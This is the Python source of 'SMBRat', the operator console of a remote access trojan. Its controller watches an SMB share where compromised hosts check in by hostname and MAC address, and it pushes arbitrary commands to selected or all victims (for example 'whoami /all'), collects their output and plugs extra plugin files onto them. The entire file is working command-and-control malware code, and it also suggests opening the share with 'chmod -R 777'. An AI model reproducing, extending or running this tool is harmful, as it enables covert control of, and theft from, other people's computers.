import argparse
import cmd
import os
import shutil
import pprint
import time

from watchdog.events import FileSystemEventHandler
from watchdog.observers import Observer

from termcolor import colored

EXEC_DAT = 'exec.dat'
OUTPUT_DAT = 'output.dat'
PING_DAT = 'ping.dat'
INFO_DAT = 'info.dat'
CHECKIN_DAT = 'checkin.dat'
PATH_DAT = 'path.dat'
HIST_DAT = 'hist.dat'
PLUGINS = 'plugins'
Share = None
No_history = False

Sessions = dict()


class CLIArgumentParser(argparse.ArgumentParser):
    def exit(self, ex_code=1, message="Unrecognised"):
        return


def get_path(agent, project=None, file=INFO_DAT):
    if project is None:
        project = find_project(agent)
    return Share + os.sep + project + os.sep + agent + os.sep + file


def get_exec_path(project, agent):
    return get_path(agent, project, EXEC_DAT)


def get_output_path(project, agent):
    return get_path(agent, project, OUTPUT_DAT)


def iterate_agents(session_dict):
    for project in session_dict.keys():
        for agent in session_dict[project]:
            yield project, agent


def get_plugins_from_path(path):
    if os.path.exists(path):
        for root, dirs, files in os.walk(path):
            return set(files)
    return set()


def find_project(agent):
    for project in Sessions.keys():
        if agent in Sessions[project].keys():
            return project
    raise Exception(
        '[!] Project Not Found for Agent "{}"'.format(colored(agent, 'red'))
    )


def initialize(share_folder):
    """
    Traverse the "Share/" shared folder and parse the tree of Projects and
    Agents.
    Share/
        |
        \--Project1
        |        |
        |        \--<Hostname1>-<MAC_ADDRESS1>
        |        \--<Hostname2>-<MAC_ADDRESS2>
        |
        \--Project2
                |
                \--<Hostname3>-<MAC_ADDRESS3>
        [...]
    """
    global Share
    Share = share_folder

    # Changed os.listdir to os.walk which returns [path/of/dir,
    # [tupple, of, directories], [tuple, of, files]]
    for project in os.listdir(share_folder):
        # print (project)
        if os.path.isfile(project):
            continue
        Sessions[project] = {}
        project_dir = Share + os.sep + project
        for agent in os.listdir(project_dir):
            if os.path.isfile(agent):
                continue
            Sessions[project][agent] = {}
            # agent_dir = project_dir + os.sep + agent + os.sep
            # Sessions[project][agent]['exec'] = os.path.isfile(
            #     agent_dir + EXEC_DAT
            # )
            # Sessions[project][agent]['output'] = os.path.isfile(
            #     agent_dir + OUTPUT_DAT
            # )


def check_active(project, agents=None, timeout=20):
    ret = {}
    if agents is None:
        agents = Sessions[project].keys()
    for agent in agents:
        agent_ping_path = get_path(agent, project, PING_DAT)
        now = int(time.time())
        # Get the Modified Time of "ping.dat" of the Agent
        mtime = os.stat(agent_ping_path)[-2]
        pinged_before = int(now) - mtime
        alive = timeout - pinged_before > 0
        ret[agent] = {
            'alive': alive,
            'last': pinged_before
        }
    return ret


class SessionHandler(FileSystemEventHandler):

    def on_created(self, event):
        # print(event, event.src_path.endswith(CHECKIN_DAT), CHECKIN_DAT)
        if event.src_path.endswith(CHECKIN_DAT):
            # if path of type .../<Share>/<ProjectName>/<Agent-MAC>/checkin.dat
            project, agent = event.src_path.split(os.sep)[-3:-1]
            # MAC characters: len('XX:XX:XX:XX:XX:XX') = 17
            agent_hostname, agent_mac = agent[:-18], agent[-17:]
            # print (project, agent_hostname, agent_mac)
            print(
                '[+] Agent "{}" ({}) just checked-in for Project: "{}"'
                .format(
                    colored(agent_hostname, 'green'),
                    colored(agent_mac, 'grey'),
                    colored(project, 'blue')
                )
            )
            Sessions[project] = {}
            Sessions[project][agent] = {}
            # print (Sessions)

    def on_deleted(self, event):
        if event.src_path.endswith(EXEC_DAT):
            # event.src_path: <Share>/<ProjectName>/<Agent-MAC>/<file_deleted>
            # changed event.src_path.split(os.sep)[-1:-1] to
            # event.src_path.split(os.sep)[-3:-1]
            project, agent = event.src_path.split(os.sep)[-3:-1]
            output_dat = get_output_path(project, agent)
            with open(output_dat, 'r') as output_file:
                response = output_file.read()
                _str = (
                    '[<] Response from "{project}/{hostname}":\n\n'
                    '{response}\n'
                    '^^^^^^^^^^^^^^^^^^^^ {project}/{hostname} '
                    '^^^^^^^^^^^^^^^^^^^^\n'
                ).format(
                    project=colored(project, 'blue'),
                    hostname=colored(agent, 'green'),
                    response=colored(response, 'white', attrs=['bold'])
                )
                print(_str)
            if not No_history:
                history_dat = get_path(agent, project, HIST_DAT)
                # os.touch(history_dat)
                # Dirty for file creation
                # os.system("touch {}".format(history_dat))
                with open(history_dat, 'a') as history_file:
                    history_file.write(
                        '{response}\n'
                        '        =========== {timestamp} ==========='
                        .format(response=response, timestamp=time.ctime())
                    )


class SMBRatShell(cmd.Cmd):

    def __init__(self, session_dict):
        super().__init__()
        self.prompt = '{}{}'.format(
            colored('SMBRat', 'red'),
            colored("> ", 'white', attrs=['bold'])
        )
        self.session_dict = session_dict
        self.selected = set()
        self.agent_list = []

    # def do_EOF(self, *args): return ''
    def emptyline(self, *args): return ''

    def do__session(self, line):
        pprint.pprint(self.session_dict)
        pass

    def do_selected(self, line):
        arg_parser = CLIArgumentParser()
        arg_parser.add_argument(
            '--add', '-a', help='Add an Agent to the "selected" list',
            nargs='+', default=[]
        )
        arg_parser.add_argument(
            '--remove', '-r', help='Remove an Agent from the "selected" list',
            nargs='+', default=[]
        )
        arg_parser.add_argument(
            '--clear', '-c', help='Remove ALL Agents from the "selected" list',
            action='store_true'
        )
        args = arg_parser.parse_args(line.split())

        if args.clear:
            self.selected = set()
            return

        arg_list = []
        if args.add:
            arg_list.extend(args.add)
        if args.remove:
            arg_list.extend(args.remove)

        for i, n_arg in enumerate(arg_list):
            try:
                agent = self.agent_list[int(n_arg)]
            except Exception:
                agent = n_arg
            try:
                find_project(agent)
            except Exception:
                print("Agent '{}' not found".format(colored(agent, 'red')))
                continue
            if i < len(args.add):  # It is an '--add' argument
                self.selected.add(agent)
            else:                    # It is an '--remove' argument
                try:
                    self.selected.remove(agent)
                except Exception:
                    print(
                        "[!] Agent {} not Selected"
                        .format(colored(agent, 'red'))
                    )

        if not self.selected:
            print(colored("No Agents selected!", 'magenta'))
            return
        self.onecmd("agents --selected")

    def do_agents(self, line):
        """
> agents

Shows the list of Selected Agents

        """
        arg_parser = CLIArgumentParser()
        arg_parser.add_argument(
            '--list', '-l',
            help='Show last Agent List', action='store_true'
        )
        arg_parser.add_argument(
            '--active', '-a',
            help='List all Active Agents', type=int, default=0, nargs='?'
        )
        arg_parser.add_argument(
            '--find', '-f',
            help='Search for a substring in all available Agent names',
            type=str
        )
        arg_parser.add_argument(
            '--selected', '-s', help='List all Selected Agents',
            action='store_true'
        )
        # arg_parser.add_argument(
        #     '-v', help='List all Agents with verbosity', action='store_true'
        # )
        args = arg_parser.parse_args(line.split())
        if args.active is None:  # If --active was set alone
            args.active = 20     # give it default value
        elif args.active <= 0:   # If --active was not set
            args.active = None   # Turn it to "None"
        # print (args.active)

        if args.selected:
            args.list = True
            self.agent_list = list(self.selected)

        if args.list:
            for i, agent in enumerate(self.agent_list):
                print("{:3}) {}".format(i, agent))
            return
        self.agent_list = []

        for project in self.session_dict.keys():
            active_agents = check_active(
                project, timeout=args.active if args.active else 20
            )
            print("=== {}".format(colored(project, 'blue')))

            for agent, act_tuple in active_agents.items():
                if args.active is not None:
                    if not act_tuple['alive']:    # if Agent isn't active
                        continue                # Do not print its status
                print("[{alive}] {agent} ({last} secs ago)".format(
                    alive=colored(
                        "X" if act_tuple['alive'] else " ", 'green',
                        attrs=['bold']
                    ),
                    agent=colored(agent, 'green'),
                    last=int(act_tuple['last'])
                    )
                )
                self.agent_list.append(agent)
        return

    def show_agent_file(self, agent, file_=INFO_DAT):
        agent_file_path = get_path(agent, file=file_)
        project = find_project(agent)
        with open(agent_file_path) as file_obj:
            content_str = file_obj.read()
        print((
            '{project} / {agent}\n'
            '{info}'
            '{ruler}'
            ).format(
                project=colored(project, 'blue'),
                agent=colored(agent, 'green'),
                info=colored(content_str, 'white', attrs=['bold']),
                ruler=colored("=" * 20, 'magenta',),
            )
        )

    def do_checkin(self, line):
        """
> checkin

Shows the date and time of Checkin as declared by the Selected Agents
        """
        if not self.selected:
            print(colored("No Agents selected!", 'magenta'))
            return
        for agent in self.selected:
            self.show_agent_file(agent, CHECKIN_DAT)

    def do_path(self, line):
        """
> path

Shows the UNC Path declared by the Selected Agents for their Writable Folders
        """
        if not self.selected:
            print(colored("No Agents selected!", 'magenta'))
            return
        for agent in self.selected:
            self.show_agent_file(agent, PATH_DAT)

    def do_sysinfo(self, line):
        """
> sysinfo

Shows System Info declared by the Selected Agents
        """
        if not self.selected:
            print(colored("No Agents selected!", 'magenta'))
            return
        for agent in self.selected:
            self.show_agent_file(agent, INFO_DAT)

    def do_execall(self, line):
        """
> execall <cmd>

Runs the <cmd> to *ALL AGENTS*
Example:
> execall "whoami /all"

        """
        saved_selected = self.selected
        allset = set()
        for project in self.session_dict.keys():
            for agent in self.session_dict[project].keys():
                allset.add(agent)

        self.selected = allset
        self.do_exec(line)
        self.selected = saved_selected

    def do_exec(self, line):
        """
> exec <cmd>

Runs the <cmd> to the selected Agents
Example:
> exec "whoami /all"
        """
        for agent in self.selected:
            print(agent)
            project = find_project(agent)
            exec_path = get_exec_path(project, agent)
            try:
                with open(exec_path, 'w+') as exfile:
                    exfile.write(line)
                    _str = (
                        '[>] Sending "{command}" to "{project}/{hostname}" ...'
                        .format(
                            command=colored(line, 'cyan', attrs=['bold']),
                            project=colored(project, 'blue'),
                            hostname=colored(agent, 'green')
                        )
                    )
                    print(_str)

            except PermissionError as perror:
                print('''
[!!!] Could not write to '{path}'.

Usually happens because the SMB Server (who creates the files) runs as "root"
    (to bind the port 445 TCP).
Type the command below to a new root shell and retry:
    chmod -R 777 "{share}"'''.format(path=exec_path, share=Share))
                return

    def do_exit(self, line):
        return True

    def do_plugins(self, line):
        arg_parser = CLIArgumentParser()
        arg_parser.add_argument(
            '--add', '-a', help='Add a Plugin to the "selected" Agent',
            nargs='+', default=[]
        )
        arg_parser.add_argument(
            '--remove', '-r', help='Remove a Plugin from the "selected" Agent',
            nargs='+', default=[]
        )
        arg_parser.add_argument(
            '--list', '-l', help='List all available Plugins',
            action='store_true'
        )
        args = arg_parser.parse_args(line.split())

        if not self.selected:
            print(colored("No Agents selected!", 'magenta'))
            return

        all_plugins = get_plugins_from_path(PLUGINS)
        plugins_add = set(args.add) & all_plugins
        plugins_remove = set(args.remove)

        for project, agent in iterate_agents(self.session_dict):
            if agent not in self.selected:
                continue

            plugin_path = get_path(agent, project, PLUGINS)
            if not os.path.exists(plugin_path):
                os.mkdir(plugin_path)

            for plugin in plugins_remove:
                installed_plugins = get_plugins_from_path(plugin_path)
                if plugin not in installed_plugins:
                    continue
                os.remove(os.path.join(plugin_path, plugin))

            for plugin in plugins_add:
                shutil.copy(os.path.join('plugins', plugin), plugin_path)

            _header = (
                '{project} / {agent}\n\n'
                'Plugins\n'
                '-------\n'
            )
            installed_plugins = get_plugins_from_path(plugin_path)
            plugin_text = '\n'.join([
                colored(
                    plugin,
                    'green' if plugin in installed_plugins else 'white'
                )
                for plugin in all_plugins
            ])
            header = _header.format(
                agent=colored(agent, 'green'),
                project=colored(project, 'blue'),
            )
            print('{header}{text}'.format(header=header, text=plugin_text))


if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument(
        'SHARE_PATH',
        help='Path to the directory that is used with the SMB Share'
    )
    parser.add_argument(
        '--no-history',
        help=(
            'Disables storing the Command Outputs in a history file per Agent'
        ),
        action='store_true'
    )
    # parser.add_argument(
    #     '--smb-auto-start', '-s',
    #     help=(
    #         'Uses impacket\'s "smbserver.py" to start an SMB Server '
    #         'with specified "ShareName"'
    #     ),
    #     default=False, action='store_true'
    # )

    args = parser.parse_args()
    # print (args)
    No_history = args.no_history
    share_folder = args.SHARE_PATH
    initialize(share_folder)

    shell = SMBRatShell(Sessions)

    observer = Observer()
    event_handler = SessionHandler()
    observer.schedule(event_handler, share_folder, recursive=True)
    observer.start()

    shell.cmdloop()
